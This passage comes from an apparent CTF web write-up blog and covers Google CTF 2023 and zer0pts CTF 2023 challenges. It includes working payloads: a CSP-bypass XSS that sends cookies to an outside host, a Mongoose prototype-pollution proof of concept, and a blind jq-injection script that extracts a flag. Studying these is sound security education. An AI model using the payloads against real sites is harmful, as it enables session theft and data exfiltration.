        iframe<span class="token punctuation">.</span>contentWindow<span class="token operator">?.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> body<span class="token punctuation">,</span> mimeType<span class="token punctuation">,</span> sandbox<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> url<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">once</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>We don’t know what the random domain is, so we can’t use postMessage as it will be blocked. It would be easier if we knew the random domain.</p>
<p>We searched through various specifications, looked at Chromium source code and bug tracker, but made little progress. The closest we found was this: <a target="_blank" rel="noopener" href="https://bugs.chromium.org/p/chromium/issues/detail?id=1359122&q=subdomain%20host%20leak&can=1">Issue 1359122: Security: SOP bypass leaks navigation history of iframe from other subdomain if location changed to about:blank</a>, which is what we needed, but it has already been fixed.</p>
<p>Just ten minutes before the end of the competition, my teammate found the <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/Location/ancestorOrigins">location.ancestorOrigins</a> property, and I realized that the child iframe can access the ancestor’s origin, which I had never noticed before (even though it’s the first property of the location object…).</p>
<p>Due to time constraints, we couldn’t complete it in the end, only a few steps were left.</p>
<p>The next step is to redirect the iframe with the flag to our prepared blob page, which can leak the sandbox domain using <code>location.ancestorOrigins</code>:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">top<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'&lt;script>top.postMessage(location.ancestorOrigins[0],"*")&lt;\/script>'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'text/html'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Once we have the sandbox domain, we can obtain XSS on this domain. After obtaining XSS, we can access the sandbox domain. Although the location of the iframe has changed, the src of the iframe remains the same, so we can directly access the blob src with the flag. After that, we just need to fetch it to obtain the flag.</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">fetch</span><span class="token punctuation">(</span>top<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>It could have been done in just a few hours initially, what a pity.</p>
<p>Here is the author’s exploit, worth learning: <a target="_blank" rel="noopener" href="https://github.com/google/google-ctf/blob/master/2023/web-postviewer2/solution/solve.html">https://github.com/google/google-ctf/blob/master/2023/web-postviewer2/solution/solve.html</a></p>
<h3><span id="noteninja-3-solves">NOTENINJA (3 solves)</span></h3><p>Basically, you can insert any HTML in this challenge, but the key point is the CSP: <code>script-src &#39;self&#39; https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/;</code></p>
<p>Initially, I thought this challenge used Next.js and would be similar to the approach used in <a href="https://blog.huli.tw/2022/08/21/en/corctf-2022-modern-blog-writeup/">corCTF 2022</a>. However, I tried for a long time but couldn’t figure it out. Only after the competition did I realize that this challenge was just about finding the CSP gadget for recaptcha…</p>
<p>Inside the recaptcha website, there is an Angular that can be used as a gadget. So the final solution is:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">++++++++++++++++++++++++++++++++++++++
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span>
  <span class="token attr-name">ng-controller</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>CarouselController as c<span class="token punctuation">"</span></span>
  <span class="token attr-name">ng-init</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>c.init()<span class="token punctuation">"</span></span>
<span class="token punctuation">></span></span>
&amp;#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">carousel</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">slides</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://www.google.com/recaptcha/about/js/main.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
++++++++++++++++++++++++++++++++++++++<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>It’s also a less-known CSP bypass that I learned.</p>
<p>Also, another team found a Mongoose 0day vulnerability: <a target="_blank" rel="noopener" href="https://huntr.dev/bounties/1eef5a72-f6ab-4f61-b31d-fc66f5b4b467/">Mongoose Prototype Pollution Vulnerability in automattic&#x2F;mongoose</a></p>
<p>The reason is in this line of code: <a target="_blank" rel="noopener" href="https://github.com/google/google-ctf/blob/master/2023/web-noteninja/challenge/src/pages/api/notes/%5Bid%5D.js#L74">https://github.com/google/google-ctf/blob/master/2023/web-noteninja/challenge/src/pages/api/notes/%5Bid%5D.js#L74</a></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">await</span> Note<span class="token punctuation">.</span><span class="token function">findByIdAndUpdate</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token operator">...</span>req<span class="token punctuation">.</span>body<span class="token punctuation">,</span> <span class="token literal-property property">htmlDescription</span><span class="token operator">:</span> htmlDescription <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>It directly takes in the entire body, and then you can create a prototype pollution through <code>$rename</code>:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> <span class="token punctuation">&#123;</span> connect<span class="token punctuation">,</span> model<span class="token punctuation">,</span> Schema <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'mongoose'</span><span class="token punctuation">;</span>

<span class="token keyword">await</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token string">'mongodb://127.0.0.1:27017/exploit'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> Example <span class="token operator">=</span> <span class="token function">model</span><span class="token punctuation">(</span><span class="token string">'Example'</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Schema</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">hello</span><span class="token operator">:</span> String <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> example <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Example</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">hello</span><span class="token operator">:</span> <span class="token string">'world!'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">await</span> Example<span class="token punctuation">.</span><span class="token function">findByIdAndUpdate</span><span class="token punctuation">(</span>example<span class="token punctuation">.</span>_id<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
    <span class="token literal-property property">$rename</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
        <span class="token literal-property property">hello</span><span class="token operator">:</span> <span class="token string">'__proto__.polluted'</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// this is what causes the pollution</span>
<span class="token keyword">await</span> Example<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> test <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>test<span class="token punctuation">.</span>polluted<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// world!</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [Object: null prototype] &#123; polluted: 'world!' &#125;</span>

process<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>With this prototype pollution vulnerability, you can use <code>find()</code> to dump all the data and see other people’s notes.</p>
<h2><span id="zer0ptsctf-2023">zer0ptsCTF 2023</span></h2><p>Let me provide a few references first:</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://nanimokangaeteinai.hateblo.jp/entry/2023/07/17/101119">zer0pts CTF writeup (in English)</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.arkark.dev/2023/07/17/zer0pts-ctf/">zer0pts CTF 2023 writeup (4 web challs)</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.maple3142.net/2023/07/16/zer0pts-ctf-2023-writeups/">zer0pts CTF 2023 Writeups</a></li>
</ol>
<p>The complete code for each challenge is available here: <a target="_blank" rel="noopener" href="https://github.com/zer0pts/zer0pts-ctf-2023-public/tree/master/web">https://github.com/zer0pts/zer0pts-ctf-2023-public/tree/master/web</a></p>
<h3><span id="warmuprofile-48-solves">Warmuprofile (48 solves)</span></h3><p>This challenge is quite interesting. You can add and delete users, and the goal is to create an admin user. However, the admin user already exists, so you need to find a way to delete it.</p>
<p>The code for deletion is as follows:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/user/:username/delete'</span><span class="token punctuation">,</span> needAuth<span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> username <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>params<span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">username</span><span class="token operator">:</span> loggedInUsername <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>loggedInUsername <span class="token operator">!==</span> <span class="token string">'admin'</span> <span class="token operator">&amp;&amp;</span> loggedInUsername <span class="token operator">!==</span> username<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">flash</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> <span class="token string">'general user can only delete itself'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// find user to be deleted</span>
    <span class="token keyword">const</span> user <span class="token operator">=</span> <span class="token keyword">await</span> User<span class="token punctuation">.</span><span class="token function">findOne</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
        <span class="token literal-property property">where</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> username <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">await</span> User<span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
        <span class="token literal-property property">where</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token operator">...</span>user<span class="token operator">?.</span>dataValues <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// user is deleted, so session should be logged out</span>
    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>If you look closely and think about it, you will notice a problem here.</p>
<p>The problem is that if you log in with two tabs at the same time, both sessions will have a username. Then, if you delete a user on one page and perform the same operation on the other page after deletion, <code>User.findOne</code> will return <code>null</code> because the user no longer exists in the database. When it reaches <code>User.destroy</code>, it becomes <code>where: &#123;&#125;</code>, which deletes everything in the database, including the admin.</p>
<h3><span id="jqi-40-solves">jqi (40 solves)</span></h3><p>In this challenge, you can execute corresponding jq commands based on the conditions you set. It was through this challenge that I discovered the many functionalities of jq.</p>
<p>The main code is this part:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token constant">KEYS</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'tags'</span><span class="token punctuation">,</span> <span class="token string">'author'</span><span class="token punctuation">,</span> <span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
fastify<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/api/search'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">request<span class="token punctuation">,</span> reply</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> keys <span class="token operator">=</span> <span class="token string">'keys'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>query <span class="token operator">?</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>keys<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token constant">KEYS</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> conds <span class="token operator">=</span> <span class="token string">'conds'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>query <span class="token operator">?</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>conds<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>keys<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">10</span> <span class="token operator">||</span> conds<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> reply<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">'invalid key or cond'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// build query for selecting keys</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> key <span class="token keyword">of</span> keys<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token constant">KEYS</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> reply<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">'invalid key'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">const</span> keysQuery <span class="token operator">=</span> keys<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">key</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>key<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">:.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>key<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// build query for filtering results</span>
    <span class="token keyword">let</span> condsQuery <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> cond <span class="token keyword">of</span> conds<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">const</span> <span class="token punctuation">[</span>str<span class="token punctuation">,</span> key<span class="token punctuation">]</span> <span class="token operator">=</span> cond<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">' in '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token constant">KEYS</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> reply<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">'invalid key'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token comment">// check if the query is trying to break string literal</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">)</span> <span class="token operator">||</span> str<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'\\('</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> reply<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">'hacking attempt detected'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        condsQuery <span class="token operator">+=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">| select(.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>key<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> | contains("</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"))</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">let</span> query <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">[.challenges[] </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>condsQuery<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> | &#123;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>keysQuery<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&#125;]</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'[+] keys:'</span><span class="token punctuation">,</span> keys<span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'[+] conds:'</span><span class="token punctuation">,</span> conds<span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span>

    <span class="token keyword">let</span> result<span class="token punctuation">;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
        result <span class="token operator">=</span> <span class="token keyword">await</span> jq<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>query<span class="token punctuation">,</span> <span class="token string">'./data.json'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">output</span><span class="token operator">:</span> <span class="token string">'json'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
        <span class="token keyword">return</span> reply<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">'something wrong'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>conds<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        reply<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">'sorry, you cannot use filters in demo version'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        reply<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Although double quotation marks are blocked, the backslash <code>\</code> is not blocked. Therefore, by combining two conditions, you can insert your own jq command and achieve command injection. You can retrieve the flag using <code>env.FLAG</code>.</p>
<p>However, the problem is that the result is not returned, so it is a blind injection. You need to leak one character at a time. Below is the exploit from the <a target="_blank" rel="noopener" href="https://blog.arkark.dev/2023/07/17/zer0pts-ctf/">zer0pts CTF 2023 writeup (4 web challs)</a>:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> httpx
<span class="token keyword">import</span> string

# <span class="token constant">BASE_URL</span> <span class="token operator">=</span> <span class="token string">"http://localhost:8300"</span>
<span class="token constant">BASE_URL</span> <span class="token operator">=</span> <span class="token string">"http://jqi.2023.zer0pts.com:8300"</span>

<span class="token constant">CHARS</span> <span class="token operator">=</span> <span class="token string">"&#125;_"</span> <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits


def <span class="token function">make_str</span><span class="token punctuation">(</span>xs<span class="token operator">:</span> str<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> str<span class="token operator">:</span>
    <span class="token keyword">return</span> <span class="token string">"("</span> <span class="token operator">+</span> <span class="token string">"+"</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">[</span>f<span class="token string">"([&#123;ord(x)&#125;] | implode)"</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> xs<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">")"</span>


def <span class="token function">is_ok</span><span class="token punctuation">(</span>prefix<span class="token operator">:</span> str<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> bool<span class="token operator">:</span>
    res <span class="token operator">=</span> httpx<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>
        f<span class="token string">"&#123;BASE_URL&#125;/api/search"</span><span class="token punctuation">,</span>
        params<span class="token operator">=</span><span class="token punctuation">&#123;</span>
            <span class="token string-property property">"keys"</span><span class="token operator">:</span> <span class="token string">"name"</span><span class="token punctuation">,</span>
            <span class="token string-property property">"conds"</span><span class="token operator">:</span> <span class="token string">","</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
                <span class="token string">"\\ in name"</span><span class="token punctuation">,</span>
                f<span class="token string">"))] + [if (env.FLAG | startswith(&#123;make_str(prefix)&#125;)) then error(&#123;make_str('x')&#125;) else 0 end] # in name"</span>
            <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token punctuation">)</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"something wrong"</span>


known <span class="token operator">=</span> <span class="token string">"zer0pts&#123;"</span>
<span class="token keyword">while</span> not known<span class="token punctuation">.</span><span class="token function">endswith</span><span class="token punctuation">(</span><span class="token string">"&#125;"</span><span class="token punctuation">)</span><span class="token operator">:</span>
    <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token constant">CHARS</span><span class="token operator">:</span>
        <span class="token keyword">if</span> <span class="token function">is_ok</span><span class="token punctuation">(</span>known <span class="token operator">+</span> c<span class="token punctuation">)</span><span class="token operator">:</span>
            known <span class="token operator">+=</span> c
            <span class="token keyword">break</span>
    <span class="token function">print</span><span class="token punctuation">(</span>known<span class="token punctuation">)</span>
<span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Flag: "</span> <span class="token operator">+</span> known<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3><span id="neko-note-26-solves">Neko Note (26 solves)</span></h3><p>This is another classic note app. The core code is as follows:</p>
